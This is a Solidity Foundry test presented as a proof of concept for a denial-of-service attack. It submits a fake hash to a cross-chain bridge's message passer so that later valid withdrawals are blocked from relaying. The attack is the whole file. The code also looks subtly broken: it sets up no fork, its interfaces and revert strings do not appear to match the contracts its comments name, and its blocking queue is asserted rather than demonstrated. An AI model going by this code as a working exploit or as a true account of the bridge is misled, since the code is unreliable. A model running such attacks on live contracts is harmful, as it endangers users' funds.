// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/Revertor.sol";

interface IMessagePasser {
    function passMessageToL1(bytes32 _hash, bytes calldata _message) external;
}

interface IMessenger {
    function relayMessage(
        bytes32 _msgHash,
        bytes32 _withdrawalHash,
        address _target,
        bytes calldata _message
    ) external;
}

contract PoC_Dos_Proof is Test {
    IMessagePasser messagePasser;
    IMessenger messenger;
    Revertor revertor;
    address target;

    bytes message = hex"abcdef";
    bytes32 fakeHash = keccak256("fake");
    bytes32 validHash = keccak256("valid");

    function setUp() public {
        revertor = new Revertor();
        target = address(revertor);

        messagePasser = IMessagePasser(0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1); // L1StandardBridge
        messenger = IMessenger(0x229047fed2591dbec1eF1118d64F7aF3dB9EB290); // L1CrossDomainMessenger
    }

    function test_PoC_FakeHashBlocksQueue() public {
        // Submit invalid message (will always revert)
        vm.prank(address(0xDEAD));
        messagePasser.passMessageToL1(fakeHash, message);
        emit log("Fake hash submitted");

        vm.expectRevert("Invalid withdrawal hash");
        messenger.relayMessage(fakeHash, fakeHash, target, message);

        // Submit valid message, but will not proceed
        vm.prank(address(0xBEEF));
        messagePasser.passMessageToL1(validHash, message);
        emit log("Valid hash submitted");

        vm.expectRevert("Message cannot be processed until previous one is cleared");
        messenger.relayMessage(validHash, validHash, target, message);
    }
}
